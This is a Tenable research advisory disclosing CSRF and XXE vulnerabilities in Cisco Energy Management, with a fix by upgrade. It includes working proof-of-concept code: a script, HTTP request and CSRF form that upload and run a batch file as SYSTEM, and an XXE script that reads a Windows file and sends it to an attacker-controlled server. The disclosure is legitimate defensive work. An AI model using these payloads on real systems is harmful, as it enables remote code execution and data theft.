# [R1] Cisco Energy Management Suite Multiple Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Tenable has discovered multiple vulnerabilities in Cisco Energy Management.

#### CVE-2018-15445: Cross-Site Request Forgery

Cisco Energy Management is largely susceptible to Cross-Site Request Forgery (CSRF) throughout the application and its underlying services. Anti-forgery tokens are not utilized to ensure that HTTP requests have originated from within the application or its connected components.

An attacker may abuse this vulnerability to gain remote code execution with SYSTEM privileges. In order to successfully exploit this weakness, the attacker must first craft a malicious page, then convince an authenticated application user to visit the URL (e.g. click a link).

Additionally, the victim user must have sufficient privileges. Scripting and API access are required.

Specifically, a working exploit can be crafted using the following methodology. Via the use of custom scripts, a script can be constructed like so. First, all Controller IDs can be retrieved by querying the object store. The controller ID is used to construct a subsequent API call. Next, a Windows batch file (.bat) is uploaded to the "commands" folder. This file can contain arbitrary system commands to be executed. In order to upload the file, the API is invoked from within the script using the "api\_post" function. After the batch file uploads, the "runCommandEx" function can be used to execute the batch file.

Please note that this logic can be contained within just one HTTP POST request.

##### Proof of Concept

Below is a series of Proof of Concept (PoC) code.

Be sure to update any IP addresses and/or 'auth' tokens. When the exploit works, a file named 'runme.bat' will be created in 'C:\Program Files\Cisco Energy Management Controller\service\commands', and 'calc.exe' will be running with SYSTEM privileges.

Custom JavaScript:

```

// get controller id
var devices = queryObjects("objecttype=orgfolder");
var jemid = devices[0]["jemid"];
// note that the devices could be looped to execute on all controllers
if (jemid) {
   var fname = "runme.bat";
   var url = "controllers/"+jemid+"/uploadFile?overwrite=true&folder=commands&name="+fname;
   var batchFile = base64Encode("systeminfo"); // batch file contents
   var response = api_post(url, batchFile);
   if (response.result) {
      var cmdResult = runCommandEx(fname);
      if (cmdResult) {
         log(cmdResult["stdout"]);
      }
   }
}

```

The following HTTP request shows the above code being POST’ed to CEM.

```

POST /central/data/jemwscall/executeScriptAsync HTTP/1.1
Host: 192.168.1.194
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0

{"script":"// get controller id\nvar devices = queryObjects(\"objecttype=orgfolder\");\nvar jemid = devices[0][\"jemid\"];\n// note that the devices could be looped to execute on all controllers\nif (jemid) {\n   var fname = \"runme.bat\";\n   var url = \"controllers/\"+jemid+\"/uploadFile?overwrite=true&folder=commands&name=\"+fname;\n   var batchFile = base64Encode(\"calc\"); // batch file contents\n   var response = api_post(url, batchFile);\n   if (response.result) {\n      var cmdResult = runCommandEx(fname);\n      if (cmdResult) {\n         log(cmdResult[\"stdout\"]);\n      }\n   }\n}","scriptLabel":"Unnamed Script","async":true,"options":"-s1 -source=JEMScriptDialog"}

```

This is an HTML form that can be used to send the exploit.

```

<html>
            <body>
            <form method="POST" enctype="text/plain" action="https://192.168.1.194/central/data/jemwscall/executeScriptAsync">
            <input name='{"script":"var devices=queryObjects(\"objecttype=orgfolder\");var jemid=devices[0][\"jemid\"];if(jemid){var fname=\"runme.bat\";var url=\"controllers/\"+jemid+\"/uploadFile?overwrite=true&folder=commands&name=\"+fname;var batchFile=base64Encode(\"calc\");var response=api_post(url,batchFile);if(response.result){var cmdResult=runCommandEx(fname);if(cmdResult){log(cmdResult[\"stdout\"]);}}}","scriptLabel":"Unnamed Script","async":true,"options":"-s1 -source=JEMScriptDialog", "trash":"' value='"}' />
            <input type="submit" />
            </form>
            </body>
</html>

```
#### CVE-2018-15444: Authenticated XML External Entity Vulnerability (XXE)

An XML External Entity (XXE) vulnerability exists in Cisco Energy Management’s scripting feature. This vulnerability can be exploited by an authenticated attacker. The contents of any file may be read from the file system and subsequently exfiltrated. Please note that this vulnerability may be exploited via Cross-Site Request Forgery (CSRF) as well.

In order to successfully exploit this, a malicious user (attacker) must have sufficient privileges. Scripting access is required.

Specifically, the vulnerability exists within the way an 'XmlDoc' is processed during conversion to a JSON using the 'toJson' function. An attacker may abuse this by crafting an XML document containing external entities. These entities may reference files on the file system.

Furthermore, using built-in Networking Scripting functions, the contents of files can be read and sent to a remote, attacker-controlled system.

##### Proof of Concept

Below is a Proof of Concept (PoC) consisting of a custom script. The PoC will read C:\WINDOWS\win.ini and send the contents, Base64 encoded, to a remote HTTP server. Run the script in the 'Run Script' dialog for a given asset/device.

In order to receive the file contents, be sure to host your own HTTP server and update the IP address to match that of your server. The request path will have to be Base64 decoded once it is received.

```

include("xml.js");
var xml = '<?xml version="1.0" ?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>';
var doc = new XmlDoc(xml);
var json = doc.toJson("json");

var exfil = base64Encode(json["foo"]);

var config = {
    url : "http://192.168.0.4:8080/"+exfil,
    timeout : 4
};

httpGet(config);

```

### Solution

Upgrade to Cisco Energy Management version 5.2.3.

# Common Vulnerability Scoring System

| Choose the version of CVSS calculator:   Version 1  Version 2  Version 3  Version 3.1 |
| --- |
| Common Vulnerability Scoring System (CVSS) Online Calculator, version 3.0 |
| Vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Attack Vector AV: Local AV: Adjacent AV: Network AV: Physical  Attack Complexity AC: Low AC: High  Privileges Required PR: None PR: Low PR: High  User Interaction UI: Required UI: None  Scope S: Unchanged S: Changed  Confidentiality Impact C: None C: Low C: High  Integrity Impact I: None I: Low I: High  Availability Impact A: None A: Low A: High     Base Score: 6.3 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploit Code Maturity E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   Select Exploit Code Maturity Parameters  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   Select Remediation Level Parameters  Report Confidence RC: Unknown  RC: Reasonable  RC: Confirmed  RC: Not Defined   Select Report Confidence Parameters     Temporal Score: 6.3 |

| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Confidentiality Requirement CR: Low  CR: Medium  CR: Not Defined  CR: High   Integrity Requirement IR: Low  IR: Medium  IR: Not Defined  IR: High   Availability Requirement AR: Low  AR: Medium  AR: Not Defined  AR: High   Modified Attack Vector MAV: Local  MAV: Adjacent  MAV: Network  MAV: Physical  MAV: Not Defined   Modified Attack Complexity MAC: Low  MAC: High  MAC: Not Defined   Modified Privileges Required MPR: None  MPR: Low  MPR: High  MPR: Not Defined   Modified User Interaction MUI: Required  MUI: None  MUI: Not Defined   Modified Scope MS: Unchanged  MS: Changed  MS: Not Defined   Modified Confidentiality MC: None  MC: Low  MC: High  MC: Not Defined   Modified Integrity MI: None  MI: Low  MI: High  MI: Not Defined   Modified Availability MA: None  MA: Low  MA: High  MA: Not Defined      Environmental Score: 6.3 |
